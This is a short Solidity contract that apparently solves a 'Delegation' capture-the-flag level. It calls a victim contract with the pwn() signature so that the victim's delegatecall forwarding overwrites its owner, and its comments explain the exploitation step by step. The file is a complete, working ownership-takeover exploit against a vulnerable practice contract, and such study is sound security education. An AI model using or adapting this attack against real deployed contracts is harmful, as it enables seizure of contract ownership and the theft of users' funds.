// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Regular delegatecall explotation.
        // AttackingDelegation calls Victim (Delegation) which forwards the
        // call to Delegate using delegatecall.
        // msg.data contains the signature of function pwn() which ends up
        // executed in Delegate contract using Delegation context.
        // We end up modifying the owner of Delegation.
        address(contractAddress).call(abi.encodeWithSignature("pwn()"));
    }
}
